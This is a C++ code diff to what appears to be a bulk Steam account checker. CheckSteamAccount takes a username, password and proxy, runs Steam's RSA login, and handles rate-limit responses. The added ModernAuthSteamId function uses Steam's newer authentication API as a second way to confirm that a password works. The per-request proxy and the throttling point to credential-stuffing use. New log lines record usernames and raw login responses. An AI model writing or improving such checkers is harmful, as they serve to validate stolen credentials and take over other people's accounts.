@@ -394,12 +394,71 @@ static std::string MergeCookies(const std::string& oldC, const std::string& newC
     return out;
 }
 
+static std::string ModernAuthSteamId(HttpSession& session, const std::string& user,
+                                     const std::string& pass, std::string& err) {
+    err.clear();
+    RawResp rk = session.Get("api.steampowered.com",
+                             "/IAuthenticationService/GetPasswordRSAPublicKey/v1?"
+                                 "account_name=" + util::UrlEncode(user), "");
+    if (!rk.ok || rk.body.empty()) {
+        err = "rsa http=" + std::to_string(rk.status);
+        return "";
+    }
+    std::string mod = jsonmini::GetString(rk.body, "publickey_mod");
+    std::string exp = jsonmini::GetString(rk.body, "publickey_exp");
+    std::string ts = jsonmini::GetString(rk.body, "timestamp");
+    if (mod.empty() || exp.empty() || ts.empty()) {
+        err = "rsa fields missing";
+        return "";
+    }
+    std::string enc = RsaEncryptPassword(mod, exp, pass);
+    if (enc.empty()) {
+        err = "rsa encrypt failed";
+        return "";
+    }
+    std::string b = "account_name=" + util::UrlEncode(user) +
+                    "&encrypted_password=" + util::UrlEncode(enc) +
+                    "&encryption_timestamp=" + util::UrlEncode(ts) +
+                    "&remember_login=false&platform=web&website_id=Community";
+    RawResp br = session.Post("api.steampowered.com",
+                              "/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
+                              b, "");
+    if (br.status == 429) {
+        g_thr.ReportRateLimited(br.retryAfterMs ? br.retryAfterMs : 4500);
+        err = "rate 429";
+        return "";
+    }
+    BanLog("modern: begin user=" + user + " http=" + std::to_string(br.status) +
+           " len=" + std::to_string(br.body.size()) +
+           (br.body.size() <= 400 ? " body=" + br.body : ""));
+    if (!br.ok || br.body.empty()) {
+        err = "begin http=" + std::to_string(br.status);
+        return "";
+    }
+    std::string low = util::ToLower(br.body);
+    if (low.find("invalid_password") != std::string::npos ||
+        low.find("invalid password") != std::string::npos) {
+        err = "invalid password";
+        return "";
+    }
+    std::string sid = jsonmini::GetString(br.body, "steamid");
+    if (sid.size() < 10) {
+        err = "no steamid in response";
+        return "";
+    }
+    return sid;
+}
+
 CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                                const std::string& proxy) {
     HttpSession session;
     if (!session.Ensure(proxy)) return {AccStatus::Error, "no session"};
 
     std::string cookie;
+
+    RawResp lh = session.Get("steamcommunity.com", "/login/home/?l=english", "");
+    if (!lh.setCookie.empty())
+        cookie = MergeCookies(cookie, lh.setCookie);
 
     long long ts = util::NowMs();
     std::string b1 = "username=" + util::UrlEncode(user) +
@@ -428,9 +487,15 @@ CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
     std::string mod = jsonmini::GetString(r1.body, "publickey_mod");
     std::string exp = jsonmini::GetString(r1.body, "publickey_exp");
     std::string stamp = jsonmini::GetString(r1.body, "timestamp");
-    if (mod.empty() || exp.empty() || stamp.empty()) return {AccStatus::Error, "bad key"};
+    if (mod.empty() || exp.empty() || stamp.empty()) {
+        BanLog("login: rsakey bad fields user=" + user + " body=" + r1.body);
+        return {AccStatus::Error, "bad key"};
+    }
     std::string enc = RsaEncryptPassword(mod, exp, pass);
-    if (enc.empty()) return {AccStatus::Error, "crypto"};
+    if (enc.empty()) {
+        BanLog("login: rsa encrypt failed user=" + user);
+        return {AccStatus::Error, "crypto"};
+    }
 
     std::this_thread::sleep_for(std::chrono::milliseconds(140));
 
@@ -485,6 +550,16 @@ CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                     sid = sid2;
                     BanLog("login: sid fallback /my -> " + sid);
                 }
+            }
+        }
+        if (sid.empty() && success) {
+            std::string err;
+            std::string sid2 = ModernAuthSteamId(session, user, pass, err);
+            if (!sid2.empty()) {
+                sid = sid2;
+                BanLog("login: sid via modern auth -> " + sid);
+            } else {
+                BanLog("login: modern auth failed user=" + user + " err=" + err);
             }
         }
         if (!sid.empty())
